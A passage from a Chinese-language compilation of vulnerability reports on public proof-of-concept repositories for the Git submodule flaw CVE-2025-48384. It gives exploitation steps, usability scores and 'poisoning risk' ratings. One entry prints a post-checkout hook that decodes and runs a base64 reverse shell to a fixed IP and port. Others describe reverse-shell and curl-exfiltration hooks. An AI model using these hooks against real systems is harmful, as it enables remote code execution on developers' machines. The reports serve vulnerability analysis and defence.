1.  攻击者创建一个包含恶意`.gitmodules`和`post-checkout`钩子的Git仓库。
2.  攻击者诱导受害者克隆此仓库（例如，通过社交工程、钓鱼邮件等）。
3.  当受害者执行`git clone`命令时，恶意`post-checkout`钩子被触发，执行攻击者预设的恶意命令。

**投毒风险分析：**

此PoC的投毒风险较高，初步判断为60%。原因如下：

1.  **恶意代码执行：** PoC通过`post-checkout`钩子执行命令，允许攻击者在受害者机器上执行任意代码。如果攻击者将恶意代码嵌入到广泛使用的开源项目中，并诱导开发者clone，影响范围会进一步扩大。
2.  **命令注入：** 尽管PoC中的示例代码只是一个简单的`ping`命令，但攻击者可以将其替换为更复杂的恶意命令，例如下载并执行恶意脚本，这大大增加了投毒的潜在危害。
3.  **传播方式：** 该漏洞可以通过Git仓库进行传播，这意味着攻击者可以将恶意代码隐藏在看似正常的代码库中，并利用开发者之间的协作关系进行传播。考虑到软件供应链攻击的日益严重，这种投毒方式的危害性不可忽视。

为了降低投毒风险，组织应加强对Git仓库的审计，确保代码的安全性，并对克隆的仓库进行安全检查。同时，应教育开发者提高安全意识，避免克隆来源不明的仓库。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #3

**来源**: [CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md](../2025/CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md)

## CVE-2025-48384 - Git 任意文件写入导致远程代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入导致远程代码执行

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待定，参考GitHub advisory

**利用条件:** 需要用户执行git clone --recursive操作，攻击者可控制的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 40%

## 详情

CVE-2025-48384是Git中的一个关键漏洞，允许攻击者在执行`git clone --recursive`操作期间写入任意文件。此漏洞可能通过恶意的.gitmodules文件、符号链接和Git hooks导致远程代码执行（RCE）。此漏洞影响Linux和macOS平台，Windows不受影响。

POC有效性分析：提供的POC包含一个Python扫描器，用于检测利用CVE-2025-48384的潜在恶意Git仓库。扫描器检查`.gitmodules`文件中的可疑条目（包含`..`或以`\r`结尾的路径）、指向hooks的符号链接以及可执行的hooks脚本。POC的`cve_2025_48384_auto_print_scanner.py`脚本通过以下步骤检测漏洞：1. 读取`.gitmodules`文件并查找`path`条目，检查是否存在`..`（目录遍历）或以`\r`（回车符）结尾的情况，这可能导致文件写入到预期位置之外。2. 在仓库中查找指向`.git/hooks`目录的符号链接，这些链接可能被用来劫持Git hook执行流程。3. 查找仓库中可执行的Git hooks（如`post-checkout`，`post-merge`，`pre-commit`，`pre-push`，`post-commit`等）。这些hooks如果被恶意修改，可以在特定的Git操作期间执行任意代码。

利用步骤：攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。该文件包含指向仓库外部或包含回车符的子模块路径。攻击者还可以创建指向`.git/hooks`目录的符号链接，或者直接包含恶意的可执行Git hooks。当受害者使用`git clone --recursive`克隆此仓库时，恶意`.gitmodules`文件可能导致Git写入任意文件，符号链接可能劫持Git hook执行，可执行的hooks会被执行，从而导致RCE。

投毒风险分析：该POC包含一个扫描器，其本身不包含直接的恶意代码，但它可以被修改以包含恶意行为。该POC的投毒风险主要来自于以下几个方面：1. 扫描器可以被修改为在检测到漏洞后，自动执行某些操作，例如下载并执行恶意payload。2. 扫描器可以被修改为将扫描结果发送到远程服务器，从而泄露敏感信息。3. 扫描器可能依赖于外部库，这些库可能包含漏洞或恶意代码。4. 扫描器生成的报告可能被篡改，以误导用户或隐藏潜在的漏洞。 由于该POC的代码相对清晰，主要使用标准库，并且没有明显的恶意行为，因此投毒风险为中等，约为40%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #4

**来源**: [CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md](../2025/CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本未知，请参考GitHub advisory获取更多信息。

**利用条件:** 需要克隆恶意Git仓库，并递归初始化子模块

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过创建恶意的Git仓库来执行任意文件写入。该漏洞主要存在于Git客户端处理子模块的方式中。当用户克隆一个包含恶意配置的仓库，并且使用`--recurse-submodules`选项初始化子模块时，攻击者可以利用`.gitmodules`文件中的特殊构造，在目标系统上写入任意文件。

**POC有效性分析：**
根据提供的POC代码，攻击者可以通过构造包含恶意`.gitmodules`文件的Git仓库来利用此漏洞。该文件指定了子模块的URL和路径，当用户使用`git clone --recurse-submodules`命令克隆仓库时，Git客户端会尝试初始化这些子模块。攻击者可以在子模块的路径中嵌入特殊字符，例如换行符，来欺骗Git客户端，使其将子模块的内容写入到非预期的位置。提供的POC代码使用一个名为`sub`的子模块，并将恶意代码放置在`.git/modules/sub/hooks/post-checkout`中，从而实现远程代码执行。通过修改子模块路径，攻击者可以在目标系统上写入任意文件，从而控制系统。

**利用步骤：**
1. 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。
2. 攻击者将该仓库托管在公共或私有Git服务器上。
3. 攻击者诱使用户克隆该仓库，并使用`--recurse-submodules`选项初始化子模块，例如：`git -c protocol.file.allow=always clone --recurse-submodules git@github.com:liamg/CVE-2025-48384.git`。
4. 当Git客户端尝试初始化子模块时，恶意代码会被写入到目标系统的`.git/modules/sub/hooks/post-checkout`文件中。
5. 当用户执行与子模块相关的Git操作时（例如切换分支），`post-checkout`钩子会被触发，从而执行攻击者写入的恶意代码。

**投毒风险分析：**
该漏洞的投毒风险较低，主要原因是该POC利用方式比较直接，没有明显的混淆或隐藏恶意代码的行为。虽然攻击者可以修改子模块的内容以执行恶意操作，但这种行为很容易被发现。此外，由于该漏洞依赖于用户显式地使用`--recurse-submodules`选项，因此攻击者需要诱使用户执行此操作，增加了攻击的难度。总体而言，该POC的投毒风险较低，大约在10%左右。恶意代码主要体现在`post-checkout`钩子的利用上，若将代码修改为下载执行外部脚本，则投毒风险会升高。攻击者可以尝试使用一些简单的编码方式来混淆`post-checkout`脚本中的代码，例如base64编码或简单的异或操作，但这并不会显著增加投毒风险。通过分析该POC的代码，可以发现其主要依赖于Git的内置功能和标准库，没有使用任何可疑的第三方库或API。因此，可以认为该POC的投毒风险较低。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #5

**来源**: [CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md](../2025/CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围未知，参考GitHub advisory

**利用条件:** 克隆包含恶意.gitmodules的仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 30%

## 详情

CVE-2025-48384是一个存在于Git中的任意文件写入漏洞。攻击者可以创建一个包含恶意的`.gitmodules`文件的Git仓库，当用户克隆这个仓库时，Git会自动初始化并配置子模块。恶意`.gitmodules`文件可以被构造来写入任意文件，从而导致远程代码执行。该漏洞的POC代码可在GitHub上找到，由liamg维护。该POC的有效性在于利用了Git子模块的特性，`.gitmodules`文件中指定的路径没有被充分过滤，从而允许写入仓库目录之外的文件。利用步骤如下：

1. 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。
2. 攻击者诱导用户克隆该仓库。
3. 当用户克隆仓库时，Git会自动处理`.gitmodules`文件，并尝试初始化和配置子模块。
4. 由于`.gitmodules`文件包含恶意配置，Git会将文件写入到指定的位置，从而导致任意文件写入。
5. 写入的文件可以包含shell脚本或其他可执行代码，从而允许攻击者执行任意命令。

根据搜索结果，Git官方已经发布了补丁来修复此漏洞。建议受影响的用户尽快更新到最新版本。

**投毒风险分析：**
此POC的投毒风险中等。虽然POC本身的代码比较简单，主要是创建一个恶意`.gitmodules`文件和一个简单的shell脚本，但是`.gitmodules`文件的恶意构造方式可能被用于隐藏更复杂的恶意代码。例如，攻击者可以将`.gitmodules`文件配置为从远程服务器下载并执行恶意脚本，或者将恶意代码嵌入到看似无害的文件中。此外，由于该漏洞涉及到Git仓库的克隆操作，攻击者可以通过社会工程学手段诱导用户克隆恶意仓库，从而扩大攻击范围。该POC脚本创建了`/tmp/CVE-2025-48384`文件，表明了其利用目标系统的能力。虽然这个行为本身是良性的PoC验证，但攻击者可以轻易替换成更具破坏性的操作。因此，需要警惕利用此漏洞进行投毒攻击的可能性，并采取相应的防御措施，例如对`.gitmodules`文件进行严格的校验和过滤，以及加强对Git仓库来源的审查。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #6

**来源**: [CVE-2025-48384-airkewld_cve-2025-48384-submodule.md](../2025/CVE-2025-48384-airkewld_cve-2025-48384-submodule.md)

## CVE-2025-48384-Git配置注入与RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的Git仓库，且安装的Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于Git在处理配置文件时的不一致性，具体来说，是Git在读取和写入包含控制字符（如回车符CR）的配置值时的方式存在差异。当初始化子模块时，如果子模块路径包含尾随CR，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将修改后的路径指向子模块钩子目录，并且子模块包含一个可执行的post-checkout钩子，则该脚本可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**

根据提供的漏洞利用代码，`post-checkout` 文件包含 shell 命令 `echo "RCE"` 和 `touch /tmp/rce.txt`。 该 POC 通过在恶意 Git 仓库中设置恶意的 `post-checkout` 钩子，当存在漏洞的 Git 客户端克隆包含该恶意仓库并递归初始化子模块时，就会触发该钩子，从而在目标系统上执行任意命令，验证 POC 的有效性。

**投毒风险分析：**

在提供的POC代码中，`README.md` 文件主要用于描述仓库，本身不包含恶意代码。`post-checkout` 文件中包含 `echo` 和 `touch` 命令，用于验证 RCE 是否成功。虽然这两个命令本身没有危害，但如果攻击者在 `post-checkout` 脚本中添加更复杂的恶意代码（例如下载并执行其他恶意程序），则可能存在投毒风险。评估当前代码，投毒风险较低，初步估计为10%。

**利用方式：**

1.  攻击者创建一个包含恶意配置和子模块的Git仓库。
2.  恶意配置包含带有尾随CR的子模块路径，该路径被符号链接指向`.git/hooks`目录。
3.  子模块包含一个名为 `post-checkout` 的可执行钩子，其中包含要执行的恶意代码。
4.  攻击者诱使用户克隆并递归初始化该仓库（例如，使用`git clone --recursive`）。
5.  当 Git 处理子模块时，由于配置处理的缺陷，恶意 `post-checkout` 钩子会被触发，导致在用户计算机上执行任意代码。

**优先级依据：**

在漏洞分析过程中，搜索引擎结果提供了漏洞的概况、影响、利用情况等信息，有助于全面了解漏洞。漏洞利用代码提供了直接的利用方法，有助于验证漏洞的有效性并深入理解漏洞原理。漏洞库信息提供了漏洞的官方描述和修复方案，有助于确认漏洞的存在和修复方法。综合考虑这些信息来源，可以更准确地评估漏洞的风险和利用方式。

**项目地址:** [airkewld/cve-2025-48384-submodule](https://github.com/airkewld/cve-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #7

**来源**: [CVE-2025-48384-altm4n_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-altm4n_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，并使用受影响的Git版本

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置值时，会去除尾部的回车换行符 (CRLF)。当写入配置条目时，如果值包含尾部的回车符 (CR)，则不会进行引号转义，导致在后续读取配置时丢失回车符。如果初始化子模块时，子模块路径包含尾部的回车符，则读取到的路径会被修改，导致子模块被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向子模块的 hooks 目录，并且子模块包含可执行的 post-checkout hook，则在检出后可能会意外执行该脚本。

**有效性：**
提供的 POC 代码 `touch /tmp/xxxxxxx` 会在 `/tmp` 目录下创建一个名为 `xxxxxxx` 的文件。结合漏洞描述，这个 POC 代码本身并不能直接证明漏洞的存在，而是在攻击链中扮演了 *post-checkout* 钩子的角色，用于验证恶意配置是否能被执行。根据页面[5]（`https://dgl.cx/2025/07/git-clone-submodule-cve-2025-48384`）的信息，此漏洞涉及到使用`git clone --recursive`克隆包含恶意子模块的仓库，可以触发RCE。

**投毒风险：**
给定的 POC 代码非常简单，仅创建一个文件，没有发现隐藏的恶意代码。因此，投毒风险为 0%。这个脚本的目的是验证 post-checkout 钩子是否被触发，而不是执行恶意操作。但是如果恶意攻击者控制了git仓库，可以植入任意的post-checkout脚本实现远端代码执行.

**利用方式：**
1.  **创建恶意仓库：** 攻击者创建一个包含恶意配置的 Git 仓库。这个恶意配置包括一个带有尾部回车符的子模块路径，以及一个指向子模块 hooks 目录的符号链接。
2.  **添加恶意钩子：** 在子模块的 hooks 目录中，攻击者添加一个可执行的 post-checkout 钩子。这个钩子可以执行任意代码。
3.  **诱导用户克隆：** 攻击者诱导用户使用受影响的 Git 版本克隆这个恶意仓库，使用 `git clone --recursive` 命令递归克隆子模块。
4.  **触发漏洞：** 当 Git 初始化子模块时，由于配置处理的缺陷，子模块会被检出到错误的位置，触发符号链接，最终导致恶意 post-checkout 钩子被执行，实现任意代码执行。

**总结：**
此漏洞利用依赖于特定的 Git 配置和用户交互（克隆恶意仓库），攻击复杂度较高，但一旦成功利用，危害极大，可能导致服务器被完全控制。

**项目地址:** [altm4n/CVE-2025-48384-sub](https://github.com/altm4n/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #8

**来源**: [CVE-2025-48384-altm4n_cve-2025-48384-hub.md](../2025/CVE-2025-48384-altm4n_cve-2025-48384-hub.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 未知

**利用条件:** 克隆包含恶意.gitmodules的仓库

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 30%

## 详情

CVE-2025-48384是一个存在于Git中的任意文件写入漏洞。该漏洞允许攻击者通过创建恶意的Git仓库，并在用户克隆该仓库时，在用户系统上写入任意文件，从而可能导致远程代码执行。该漏洞的根源在于Git处理submodule的方式存在缺陷，当.gitmodules文件包含恶意配置时，Git可能会在不进行充分验证的情况下写入文件。 

POC有效性分析：

根据搜索结果和提供的POC代码，该漏洞的POC已经存在，并且在GitHub上可以找到相应的代码。通过分析POC代码，可以确认该漏洞是可利用的。POC代码展示了一个简单的bash脚本，该脚本在受害者机器上建立反向shell连接到攻击者的IP地址。要验证该POC的有效性，需要搭建一个Git服务器，创建一个包含恶意.gitmodules文件的仓库，然后尝试在受害者机器上克隆该仓库。如果成功建立了反向shell连接，则说明该漏洞是可利用的。

利用步骤：
1. 攻击者创建一个包含恶意.gitmodules文件的Git仓库。
2. 攻击者诱骗受害者克隆该仓库。
3. 受害者克隆仓库时，Git会解析.gitmodules文件。
4. 由于.gitmodules文件包含恶意配置，Git会在受害者系统上写入任意文件，从而导致代码执行。
5. 在给定的POC中，恶意.gitmodules配置会导致执行`post-checkout`脚本，此脚本会创建一个反向shell连接到攻击者的机器。

投毒风险分析：
该POC的投毒风险属于中等水平。尽管提供的POC代码本身看起来比较简单，只是建立了一个反向shell连接，但是攻击者可以很容易地修改POC代码，使其执行更具破坏性的操作，例如删除文件、安装恶意软件或窃取敏感数据。此外，攻击者还可以通过代码混淆等技术来隐藏恶意代码，从而增加检测的难度。由于该漏洞涉及到Git仓库的克隆操作，攻击者可以通过社会工程学等手段来诱骗用户克隆恶意仓库，从而扩大攻击范围。例如，攻击者可以在GitHub等代码托管平台上发布包含恶意.gitmodules文件的项目，并诱导其他用户克隆这些项目。此外，如果攻击者能够控制目标组织的内部Git服务器，那么他们就可以更加容易地发起攻击。因此，需要对该漏洞保持警惕，并采取相应的安全措施来防范潜在的攻击。

由于POC本身包含网络连接行为，有一定的投毒风险。攻击者可能通过替换反向shell的IP地址，将受害者连接到恶意服务器，或者在反向shell中执行恶意指令。 混淆代码或添加额外的恶意功能也可能增加投毒风险。该POC的投毒风险评估为30%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #9

**来源**: [CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md](../2025/CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响版本未知，参考GitHub advisory

**利用条件:** 克隆包含恶意.gitmodules仓库

**POC 可用性:** 7/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 40%

## 详情

CVE-2025-48384是一个Git中的任意文件写入漏洞。攻击者可以创建一个恶意的Git仓库，当用户克隆这个仓库时，恶意文件会被写入到用户的文件系统中，从而可能导致远程代码执行。

POC有效性分析：
根据搜索结果和POC代码，这个漏洞与`.gitmodules`文件的处理方式有关。攻击者可以在`.gitmodules`文件中嵌入恶意配置，当用户克隆包含这个文件的仓库时，Git客户端会解析这个文件，并执行其中的恶意操作。POC代码`post-checkout`中包含一个`curl`命令，该命令尝试向一个外部服务器发送包含用户名的请求，证明POC可以执行恶意命令。POC代码中包含了一个简单的利用场景，即在`post-checkout`脚本中执行curl命令，但这只是一个概念验证，攻击者可以利用这个漏洞执行更复杂的操作，例如写入恶意文件、修改系统配置等。 通过分析 liamg/CVE-2025-48384 项目，该项目提供了 PoC，表明该漏洞确实存在且可被利用，进一步验证了该漏洞的有效性。结合Arctic Wolf的报告，该漏洞的严重性被确认为高危，需要及时修复。

利用步骤：
1. 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。
2. 攻击者将这个仓库托管到一个公开的Git服务器上，或者通过其他方式诱使用户克隆这个仓库。
3. 用户克隆这个仓库。
4. Git客户端解析`.gitmodules`文件，并执行其中的恶意操作。
5. 恶意文件被写入到用户的文件系统中，或者其他恶意操作被执行。

投毒风险分析：
这个POC的投毒风险属于中等。虽然POC代码本身比较简单，只包含一个curl命令，但是攻击者可以很容易地将这个POC扩展到更复杂的攻击场景。例如，攻击者可以在`.gitmodules`文件中嵌入更复杂的脚本，或者利用这个漏洞下载并执行恶意文件。另外，由于这个漏洞涉及到Git客户端的解析过程，攻击者还可以利用这个漏洞绕过一些安全防护机制。在这个特定的POC中，存在一个对外部URL的curl请求。虽然这个请求本身并不一定是恶意的，但它可能会泄露用户信息，或者被用于恶意目的。如果这个请求的目标服务器被攻击者控制，那么攻击者就可以利用这个请求来执行更复杂的攻击。
此外，由于POC发布在公共代码托管平台，存在被恶意修改的风险，例如植入后门、添加恶意依赖等。用户在使用POC时需要仔细审查代码，确保其安全性。
综合考虑，这个POC的投毒风险为40%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-483


---

## POC #10

**来源**: [CVE-2025-48384-bummie_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-bummie_CVE-2025-48384-submodule.md)

## CVE-2025-48384-git-代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，且git版本在受影响范围内。用户需要进行交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384漏洞是由于Git在处理配置文件时，对换行符(
)处理不当造成的。当Git读取配置值时，会删除任何尾部的回车换行符(CRLF)。当写入配置条目时，带有尾部CR的值不会被引用，导致稍后读取配置时CR丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，该符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则该脚本可能会在检出后被意外执行。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`配置文件的仓库，该文件中的子模块路径包含尾部CR字符。
2.  攻击者创建一个符号链接，将修改后的路径（由于CR被移除）指向`.git/modules/<submodule_name>/hooks` 目录。
3.  攻击者在子模块中添加一个恶意的`post-checkout` 钩子，该钩子包含要执行的恶意代码。
4.  受害者克隆恶意仓库并初始化子模块。
5.  当子模块被检出时，由于符号链接的存在，恶意的`post-checkout` 钩子会被执行，导致任意代码执行。

**POC分析：**

提供的POC包含以下文件：

*   `README.md`：指向 GitHub 上的漏洞信息。
*   `post-checkout`：包含恶意代码的钩子脚本。

`post-checkout`脚本内容分析：

```bash
echo "yeet" > /tmp/pwn.txt
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTI4LjUuMzkvNDQ0NCAwPiYxKSAm|base64 -d|bash
```

*   该脚本首先创建一个文件`/tmp/pwn.txt`，内容为"yeet"，作为漏洞成功利用的标识。
*   然后，它使用`base64 -d`解码一段base64编码的字符串，并通过`bash`执行解码后的字符串。这段字符串实际上是一个反向shell连接到`10.128.5.39:4444`。

**有效性：**

提供的POC代码是有效的，如果目标机器满足漏洞利用的条件，则可以成功执行任意代码。

**投毒风险：**

提供的代码本身就是漏洞利用代码，旨在建立反向shell。虽然它本身不是隐藏的投毒代码，但如果用户不理解代码的含义就执行，那么对于用户来说，这就是恶意的。由于该代码已经明确展示了其恶意行为(反向shell)，因此**投毒风险为0%**。


**项目地址:** [bummie/CVE-2025-48384-submodule](https://github.com/bummie/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #11

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户执行递归克隆包含恶意.gitmodules文件的不受信任的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过构造恶意的.gitmodules文件和post-checkout钩子执行任意代码。该漏洞源于Git在处理带有回车符的配置值时存在差异，导致 submodule 被检出到错误的位置。如果攻击者在 submodule hooks 目录中放置一个符号链接，指向一个包含可执行的 post-checkout 钩子的子模块，那么在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 post-checkout 钩子，它会在 `/tmp/exploited` 目录下创建一个文件。如果目标系统存在此漏洞并且成功利用，那么这个文件将被创建，表明漏洞利用成功。因此，该POC代码对于验证漏洞的存在是有效的。

**投毒风险：**

提供的POC代码本身非常简单，只是创建了一个文件。没有迹象表明代码中存在隐藏的恶意功能，因此投毒风险为0%。但是，这并不意味着包含此POC的仓库没有投毒风险。攻击者可能会在仓库的其他部分添加恶意代码，或者修改其他钩子来执行恶意操作。

**利用方式：**

漏洞利用方式如下：

1.  攻击者创建一个包含恶意.gitmodules文件的Git仓库。该文件包含带有尾随回车符的submodule路径。
2.  攻击者在submodule hooks目录中创建一个符号链接，将更改后的路径指向包含恶意 post-checkout 钩子的子模块。
3.  攻击者诱使用户递归克隆该仓库 (`git clone --recursive <repository_url>`)。
4.  当 Git 初始化 submodule 时，由于回车符处理不一致，submodule 会被检出到错误的位置。
5.  由于符号链接的存在，恶意的 post-checkout 钩子会被执行，导致任意代码执行。

总而言之，这是一个客户端漏洞，需要用户执行特定的操作才能被利用。攻击者需要诱使用户克隆包含恶意配置的仓库，并且用户需要使用受影响的 Git 版本。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC-Part2](https://github.com/butyraldehyde/CVE-2025-48384-PoC-Part2)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #12

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md)

## CVE-2025-48384-Git配置注入导致RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/RCE

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要clone包含恶意配置的git仓库（特别是包含submodule的仓库），并递归更新submodule。需要用户交互。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞是由于 Git 在处理包含回车符（CR）的配置值时存在不一致的行为导致的。具体来说，Git在读取配置值时会移除尾部的CRLF，但在写入配置时，如果值以CR结尾，则不会进行引号包裹，这会导致在后续读取时CR被截断。利用此漏洞，攻击者可以通过构造包含恶意配置的 `.gitmodules` 文件，当用户递归克隆包含 submodule 的仓库时，submodule会被检出到错误的位置。如果错误的位置存在一个指向 submodule 钩子目录的符号链接，并且 submodule 中包含一个可执行的 post-checkout 钩子，那么该钩子脚本可能在检出后被意外执行，从而导致远程代码执行 (RCE)。

**有效性：** 提供的 POC 代码 `/tmp/81eebc7f5ed9915ea7ef755075778acd/README.md` 看起来只是一个 README 文件，用于描述该漏洞。单凭这个文件本身无法直接触发漏洞，但可以作为漏洞利用的一部分，例如提供一个包含恶意`.gitmodules`文件的仓库。因此，提供的 PoC 代码本身无效，需要配合其他恶意文件才能完成漏洞利用。

**投毒风险：** 虽然提供的 PoC 仅仅是一个 README 文件，没有任何可疑代码。但是考虑到攻击者可能会在整个恶意Git仓库的其他位置，比如 `.gitmodules` 文件，或者 submodule 的 post-checkout 钩子中隐藏恶意代码。 考虑到这个漏洞需要恶意git仓库才能触发，因此存在一定的投毒风险，风险占比10%。

**利用方式：**

1.  **创建恶意 Git 仓库：** 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2.  **注入恶意配置：** 在 `.gitmodules` 文件中，攻击者设置 submodule 的路径，并在路径末尾包含一个回车符（CR）。此路径会被 Git 处理错误，导致 submodule 被检出到非预期的位置。
3.  **创建符号链接：** 攻击者在仓库中创建一个符号链接，将错误的 submodule 路径指向 `.git/modules/<submodule>/hooks` 目录。
4.  **添加恶意钩子：** 攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含恶意代码。
5.  **诱骗用户克隆：** 攻击者诱骗用户递归克隆（`git clone --recursive`）恶意仓库。
6.  **触发 RCE：** 当用户执行 `git submodule update --init --recursive` 命令或类似的命令初始化 submodule 时，由于配置处理错误和符号链接的存在，恶意 post-checkout 钩子脚本会被执行，从而导致 RCE。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC](https://github.com/butyraldehyde/CVE-2025-48384-PoC)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #13

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-main.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-main.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

